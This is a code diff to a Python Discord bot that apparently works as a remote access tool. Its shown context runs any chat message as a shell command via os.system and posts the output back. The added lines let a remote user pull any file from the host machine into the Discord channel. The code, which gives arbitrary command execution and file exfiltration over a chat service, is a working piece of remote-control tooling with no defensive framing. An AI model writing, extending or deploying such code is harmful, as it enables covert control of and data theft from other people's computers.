@@ -365,6 +365,13 @@ class MyClient(discord.Client):
                         await message.channel.send(f'Changed directory to: {os.getcwd()}')
                     except Exception as e:
                         await message.channel.send(f'Failed to change directory: {e}')
+                elif message.content.strip().startswith('download '):
+                    file = message.content.strip()[9:].strip()
+                    # send file to the channel
+                    if os.path.exists(file):
+                        await message.channel.send(file=discord.File(file))
+                    else:
+                        await message.channel.send(f'File "{file}" does not exist.')
                 else:
                     os.system(f'{message.content} > C:/announcer/output.txt')
                     await message.channel.send(f'Command "{message.content}" executed, output was:')
